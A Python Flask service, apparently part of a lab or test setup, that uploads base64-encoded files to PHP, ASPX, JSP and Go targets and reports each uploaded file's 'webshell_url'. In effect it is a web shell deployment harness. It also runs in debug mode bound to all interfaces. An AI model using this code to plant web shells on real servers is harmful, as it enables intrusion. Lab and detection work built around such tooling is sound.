import os
import base64
import requests
from flask import Flask, request, jsonify

app = Flask(__name__)

TARGETS = {
    "php": {
        "url": os.environ.get("PHP_TARGET", "http://php-target"),
        "upload_path": "/uploads/",
        "port": 80,
    },
    "aspx": {
        "url": os.environ.get("ASPX_TARGET", "http://aspx-target"),
        "upload_path": "/uploads/",
        "port": 80,
    },
    "jsp": {
        "url": os.environ.get("JSP_TARGET", "http://jsp-target:8080"),
        "upload_path": "/uploads/",
        "port": 8080,
    },
    "go": {
        "url": os.environ.get("GO_TARGET", "http://go-target:8080"),
        "upload_path": "/plugins/",
        "port": 8080,
    },
}


@app.route("/status", methods=["GET"])
def status():
    results = {}
    for name, target in TARGETS.items():
        try:
            resp = requests.get(target["url"], timeout=5)
            results[name] = {
                "status": "up",
                "code": resp.status_code,
            }
        except Exception as e:
            results[name] = {
                "status": "down",
                "error": str(e),
            }
    return jsonify(results)


@app.route("/deploy", methods=["POST"])
def deploy():
    data = request.get_json()
    if not data:
        return jsonify({"error": "JSON body required"}), 400

    target_name = data.get("target")
    file_content_b64 = data.get("file")
    filename = data.get("filename")

    if not all([target_name, file_content_b64, filename]):
        return jsonify({"error": "target, file, and filename required"}), 400

    if target_name not in TARGETS:
        return jsonify({"error": f"Unknown target: {target_name}"}), 400

    target = TARGETS[target_name]
    file_content = base64.b64decode(file_content_b64)

    upload_url = f"{target['url']}{target['upload_path']}{filename}"
    try:
        resp = requests.post(upload_url, data=file_content, timeout=10)
        webshell_url = f"{target['url']}{target['upload_path']}{filename}"
        return jsonify({
            "success": True,
            "webshell_url": webshell_url,
            "status_code": resp.status_code,
        })
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500


@app.route("/health", methods=["GET"])
def health():
    return jsonify({"status": "ok"})


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
